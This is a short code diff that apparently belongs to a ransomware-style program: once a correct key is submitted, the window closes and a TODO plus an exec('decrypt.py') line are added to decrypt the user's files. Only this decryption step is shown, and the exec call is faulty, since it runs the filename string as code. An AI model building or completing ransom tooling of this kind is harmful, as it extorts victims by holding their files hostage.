@@ -58,6 +58,8 @@ def clicking_submit():
                 # Closes out the window and decrypts the user's files
                 window.destroy()
                 # TODO: Should execute the script to decrypt the encrypted files
+                # TODO: Change this to .exe before compiling it to such otherwise, might not work
+                exec("decrypt.py")
         else:
             print("Incorrect.")
             break
